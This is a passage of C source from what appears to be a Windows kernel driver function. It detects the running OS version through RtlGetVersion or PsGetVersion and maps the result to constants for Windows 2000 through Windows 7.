	FPN_RtlGetVersion pfnRtlGetVersion = NULL; 
	
	RtlInitUnicodeString(&ustrFuncName, L"RtlGetVersion"); 
	pfnRtlGetVersion = (FPN_RtlGetVersion)MmGetSystemRoutineAddress(&ustrFuncName); 
	
	if (pfnRtlGetVersion)
	{ 
		pfnRtlGetVersion(&osverinfo);
	} 
	else 
	{
		PsGetVersion(&osverinfo.dwMajorVersion, &osverinfo.dwMinorVersion, &osverinfo.dwBuildNumber, NULL);
	}
	
	if (osverinfo.dwMajorVersion == 5 && osverinfo.dwMinorVersion == 0) {
		g_osver = WINDOWS_VERSION_2K;
	} else if (osverinfo.dwMajorVersion == 5 && osverinfo.dwMinorVersion == 1) {
		g_osver = WINDOWS_VERSION_XP;
		if(sizeof(PCHAR) == 8)	g_osver = WINDOWS_VERSION_XP_64;
	} else if (osverinfo.dwMajorVersion == 5 && osverinfo.dwMinorVersion == 2) {
		if (osverinfo.wServicePackMajor==0) { 
			g_osver = WINDOWS_VERSION_2K3;
		} else {
			g_osver = WINDOWS_VERSION_2K3_SP1_SP2;
		}
	} else if (osverinfo.dwMajorVersion == 6 && osverinfo.dwMinorVersion == 0) {
		g_osver = WINDOWS_VERSION_VISTA;
	}
	else if (osverinfo.dwMajorVersion == 6 && osverinfo.dwMinorVersion == 1) {
		g_osver = WINDOWS_VERSION_WIN7;
		if(sizeof(PCHAR) == 8)	g_osver = WINDOWS_VERSION_WIN7_64;
	}
	return g_osver;
}

